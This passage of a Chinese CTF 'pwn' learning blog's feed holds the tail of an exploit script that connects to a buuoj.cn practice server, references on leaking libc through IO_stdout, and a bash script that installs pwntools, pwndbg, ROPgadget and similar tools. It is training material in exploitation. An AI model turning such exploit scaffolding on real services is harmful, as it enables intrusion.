class=&#34;line&#34;&gt;pwn()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;while 1:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    try:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        pwn()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    except KeyboardInterrupt:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        p.close()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        p = remote(&amp;quot;node4.buuoj.cn&amp;quot;,&amp;quot;27593&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        #p = process(binary)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    except :&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        p.close()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        #p = process(binary)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        p = remote(&amp;quot;node4.buuoj.cn&amp;quot;,&amp;quot;27593&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        &amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;参考&#34;&gt;&lt;a href=&#34;#参考&#34; class=&#34;headerlink&#34; title=&#34;参考&#34;&gt;&lt;/a&gt;参考&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/u014377094/article/details/124577350&#34;&gt;https://blog.csdn.net/u014377094/article/details/124577350&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/csdn546229768/article/details/123717993&#34;&gt;https://blog.csdn.net/csdn546229768/article/details/123717993&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;IO_stdout泄漏libc&lt;/p&gt;
&lt;p&gt;pwndbg: parseheap&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/320151545&#34;&gt;https://zhuanlan.zhihu.com/p/320151545&lt;/a&gt; 这个蛮详细的&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/zzq487782568/article/details/123773034&#34;&gt;https://blog.csdn.net/zzq487782568/article/details/123773034&lt;/a&gt; 这个整体思路可以 利用unstortedbin打stdout泄露出libc&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/LynneHuan/p/14851770.html&#34;&gt;https://www.cnblogs.com/LynneHuan/p/14851770.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://j-kangel.github.io/2020/03/13/%E5%88%A9%E7%94%A8-IO-2-1-stdout-%E6%B3%84%E6%BC%8Flibc/#%E5%88%86%E6%9E%90&#34;&gt;https://j-kangel.github.io/2020/03/13/利用-IO-2-1-stdout-泄漏libc/#分析&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;遗留问题&#34;&gt;&lt;a href=&#34;#遗留问题&#34; class=&#34;headerlink&#34; title=&#34;遗留问题&#34;&gt;&lt;/a&gt;遗留问题&lt;/h1&gt;&lt;p&gt;为什么后来分配的 malloc(4,0x10)的fd和nt是那个值呢？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;枚举的话, 不用增加点偏移吗, 或者说偏移也有可能是0?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;pwndbg: parseheap&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-10-25T08:58:22.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-43-pwn%E5%81%9A%E9%A2%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E8%84%9A%E6%9C%AC/</id>
        <title>pwn入门-43-pwn做题环境搭建脚本</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-43-pwn%E5%81%9A%E9%A2%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E8%84%9A%E6%9C%AC/"/>
        <content type="html">&lt;p&gt;​		之前m1不支持x86,一直用云服务器有时候经常换,每次都需要手动搭建环境,一直想写个脚本,但有时候一直懒…终于整理出来了..&lt;/p&gt;
&lt;p&gt;&lt;font color=&#34;red&#34;&gt;(感谢chatgpt)&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​		然后这个脚本目前还有很多小问题和可以改进的地方&lt;/p&gt;
&lt;h2 id=&#34;要安装的内容&#34;&gt;&lt;a href=&#34;#要安装的内容&#34; class=&#34;headerlink&#34; title=&#34;要安装的内容&#34;&gt;&lt;/a&gt;要安装的内容&lt;/h2&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 必要的安装&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;apt-get update&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 安装常用工具&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt install -y git vim gdb strace ltrace  socat netcat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 安装pwntools&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -m pip install --upgrade pip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -m pip install --upgrade pwntools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 安装pwndbg&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git &lt;span class=&#34;built_in&#34;&gt;clone&lt;/span&gt; https://github.com/pwndbg/pwndbg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; pwndbg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo ./setup.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;source /ctfpwntools/pwndbg/gdbinit.py&amp;quot;&lt;/span&gt; &amp;gt;&amp;gt; ~/.gdbinit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; ..&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 安装glibc-all-in-one&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git &lt;span class=&#34;built_in&#34;&gt;clone&lt;/span&gt; https://github.com/matrix1001/glibc-all-in-one.git&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; glibc-all-in-one/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 update_list&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; ..&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 安装ROPgadget&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pip install capstone&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git &lt;span class=&#34;built_in&#34;&gt;clone&lt;/span&gt; https://github.com/JonathanSalwan/ROPgadget.git&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; ROPgadget&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo python3 setup.py install&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# one_gadget&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;apt -y install ruby&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gem install one_gadget &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# LibcSearcher&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git &lt;span class=&#34;built_in&#34;&gt;clone&lt;/span&gt; https://github.com/lieanu/LibcSearcher.git&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; LibcSearcher&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 setup.py develop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; ..&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# patchelf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;apt-get install autoconf automake libtool&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git &lt;span class=&#34;built_in&#34;&gt;clone&lt;/span&gt; https://github.com/NixOS/patchelf.git&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; patchelf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./bootstrap.sh &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./configure&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make check&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make install&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; ..&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;##  seccomp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 1.添加仓库&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sudo add-apt-repository ppa:brightbox/ruby-ng&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sudo apt-get update&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 2.指定安装 ruby 2.6 版本&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sudo apt-get install ruby2.6 ruby2.6-dev &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 3.然后安装 seccomp-tools&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sudo gem install seccomp-tools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 32位libc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dpkg --add-architecture i386&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;apt-get install libc6:i386&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;apt-get install libgtk2.0-0:i386&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;简单的开始&#34;&gt;&lt;a href=&#34;#简单的开始&#34; class=&#34;headerlink&#34; title=&#34;简单的开始&#34;&gt;&lt;/a&gt;简单的开始&lt;/h2&gt;&lt;p&gt;​		简单的创建while循环,指定安装次数&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#! /bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;mkdir&lt;/span&gt; /ctfpwntools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; /ctfpwntools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MAX_RETRIES=3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;INSTALL_SUCCESS=&lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RETRY_COUNT=0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 更新apt源&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt update&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 安装常用工具&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt install -y git vim gdb strace ltrace nmap socat netcat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 安装pwntools&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; [ &lt;span class=&#34;variable&#34;&gt;$RETRY_COUNT&lt;/span&gt; -lt &lt;span class=&#34;variable&#34;&gt;$MAX_RETRIES&lt;/span&gt; ] &amp;amp;&amp;amp; [ &lt;span class=&#34;string&#34;&gt;&amp;quot;&lt;span class=&#34;variable&#34;&gt;$INSTALL_SUCCESS&lt;/span&gt;&amp;quot;&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt; ]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Attempt &lt;span class=&#34;subst&#34;&gt;$((RETRY_COUNT+1)&lt;/span&gt;) to install pwntools...&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    apt-get install -y python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    python3 -m pip install --upgrade pip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    python3 -m pip install --upgrade pwntools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 检查安装是否成功&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; [ $? -eq 0 ]; &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        INSTALL_SUCCESS=&lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        RETRY_COUNT=$((RETRY_COUNT+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; [ &lt;span class=&#34;string&#34;&gt;&amp;quot;&lt;span class=&#34;variable&#34;&gt;$INSTALL_SUCCESS&lt;/span&gt;&amp;quot;&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt; ]; &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;pwntools installed successfully!&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 